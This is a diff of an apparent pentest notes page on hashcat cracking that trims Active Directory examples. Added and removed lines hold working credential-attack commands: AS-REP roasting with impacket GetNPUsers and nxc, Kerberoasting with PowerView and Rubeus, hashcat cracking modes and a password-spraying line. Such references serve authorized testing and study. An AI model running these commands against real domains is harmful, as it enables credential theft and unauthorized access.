@@ -39,10 +39,13 @@ hashcat -m 1000 ntlm.hash --show
 **Kali**
 
 ```bash
-hashcat -m HASH_MODE hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m HASH_MODE hashes.txt WORDLIST
+hashcat -m HASH_MODE hashes.txt WORDLIST -r /usr/share/hashcat/rules/best64.rule
 hashcat -m HASH_MODE hashes.txt --show
-# Common modes: NTLM 1000; NetNTLMv2 5600; Kerberoast 13100; AS-REP 18200
+# Common modes: NTLM 1000; NetNTLMv2 5600; TGS RC4 13100; TGS AES256 19700; AS-REP 18200
 ```
+
+Add -O for optimized kernels or --user when input lines start with username:.
 
 ## If it fails
 
@@ -52,51 +55,13 @@ hashcat -m HASH_MODE hashes.txt --show
 
 ## Notebook recipes
 
-40 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+33 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
-
-<Accordion title="Request the artifact and preserve output">
-
-### Request the artifact and preserve output
-
-**AS-REP Roasting: Quick Reference**
-
-```bash
-impacket-GetNPUsers 'DOMAIN_FQDN/' -dc-ip DC_IP \
-  -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
-
-nxc ldap DC_FQDN -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD' --asreproast asrep.hash
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [AS-REP Roasting: Quick Reference — Request the artifact and preserve output](/active-directory/asrep-roasting#request-the-artifact-and-preserve-output)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
 
 <Accordion title="Turn recovery into a verified lead">
 
 ### Turn recovery into a verified lead
-
-**AS-REP Roasting: Quick Reference**
-
-```bash
-# Linux (Impacket) — with a userlist (no creds) or authenticated
-GetNPUsers.py $DOMAIN/ -dc-ip $DC -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
-GetNPUsers.py $DOMAIN/USER:PASS -dc-ip $DC -request         # authenticated: find them all
-nxc ldap $DC -u USER -p PASS --asreproast asrep.hash
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [AS-REP Roasting: Quick Reference — Turn recovery into a verified lead](/active-directory/asrep-roasting#turn-recovery-into-a-verified-lead)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
 
 **AS-REP Roasting: Quick Reference**
 
@@ -271,30 +236,6 @@ Stopped: Mon Apr 11 16:49:37 2022
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
-
-</Accordion>
-
-<Accordion title="Check preauthentication behavior for a bounded user list">
-
-### Check preauthentication behavior for a bounded user list
-
-**GetNPUsers.py**
-
-```bash
-impacket-GetNPUsers 'DOMAIN_FQDN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
-```
-
-</Accordion>
-
-<Accordion title="Commands">
-
-### Commands
-
-**GetNPUsers.py**
-
-```bash
-impacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash
-```
 
 </Accordion>
 
@@ -479,52 +420,9 @@ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
 
 </Accordion>
 
-<Accordion title="Export All Results to CSV">
-
-### Export All Results to CSV
-
-**Kerberoasting from Windows**
-
-```powershell
-Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Kerberoasting from Windows — Export All Results to CSV](/active-directory/kerberoasting-windows#export-all-results-to-csv)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Quick Reference">
 
 ### Quick Reference
-
-**Kerberoasting from Windows**
-
-```powershell
-# Request a ticket for one SPN
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
-
-# PowerView enumeration and ticket request
-Import-Module .\PowerView.ps1
-Get-DomainUser * -spn | select samaccountname
-Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
-
-# Rubeus statistics and a targeted request
-.\Rubeus.exe kerberoast /stats
-.\Rubeus.exe kerberoast /user:<USER> /nowrap
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Kerberoasting from Windows — Quick Reference](/active-directory/kerberoasting-windows#quick-reference)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
 
 **Kerberoasting from Windows**
 
@@ -541,25 +439,6 @@ hashcat -m 19700 aes256_hashes wordlist.txt
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Kerberoasting from Windows — Quick Reference](/active-directory/kerberoasting-windows#quick-reference)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Request a Ticket for One User">
-
-### Request a Ticket for One User
-
-**Kerberoasting from Windows**
-
-```powershell
-Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Kerberoasting from Windows — Request a Ticket for One User](/active-directory/kerberoasting-windows#request-a-ticket-for-one-user)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -935,6 +814,8 @@ proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]
 - [Official documentation 1](https://hashcat.net/wiki/doku.php?id=hashcat)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
